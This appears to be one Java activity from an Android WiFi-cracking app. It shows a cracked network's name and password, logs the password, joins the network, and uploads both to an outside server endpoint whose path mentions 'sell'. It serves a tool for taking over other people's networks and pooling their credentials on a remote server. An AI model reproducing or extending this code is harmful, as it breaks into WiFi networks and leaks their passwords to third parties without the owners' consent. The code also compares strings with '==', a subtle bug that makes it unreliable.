package com.wifi.xcracker;



import android.content.Intent;
import android.os.Bundle;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.wifi.xcracker.task.HttpListener;
import com.wifi.xcracker.task.Request;
import com.wifi.xcracker.task.RequestExecutor;
import com.wifi.xcracker.task.RequestMethod;
import com.wifi.xcracker.task.Response;
import com.wifi.xcracker.util.Logger;
public class SuccessActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_success);

        Intent intent=getIntent();
        Bundle bundle=intent.getExtras();

        String ssid=bundle.getString("ssid");
        String password=bundle.getString("password");

        if (bundle.getString("exist_info")=="exist_info")
        {
            Logger.i(password);
            WifiAdmin wifiAdmin = new WifiAdmin(this);
            wifiAdmin.openWifi();
            wifiAdmin.addNetwork(wifiAdmin.CreateWifiInfo(ssid, password, 2));
        }

        TextView myTextView1 = (TextView) findViewById(R.id.successInfo);
        myTextView1.setText("破解成功！");

        TextView myTextView2 = (TextView) findViewById(R.id.ssid);
        myTextView2.setText("WIFI名称："+ssid);

        TextView myTextView3 = (TextView) findViewById(R.id.password);
        myTextView3.setText("WIFI密码："+password);

        //上传
        requestCreate(ssid,password);
        Toast.makeText(this, "已将热点名称和密码共享至服务器密码库！", Toast.LENGTH_SHORT).show();

    }


    private void requestCreate(String ssid, String password){

        //TODO url
        Request request = new Request("http://program1.mynatapp.cc/sell/crack/create", RequestMethod.POST);
        request.add("wifiName",ssid);
        request.add("wifiPassword", password);


        RequestExecutor.INSTANCE.execute(request,new HttpListener(){
            @Override
            public void onSucceed(Response response) {
                Logger.i("成功");
            }

            @Override
            public void onFailed(Exception e) {
                Logger.i("请求失败:"+ e.getMessage());
            }
        });

    }
}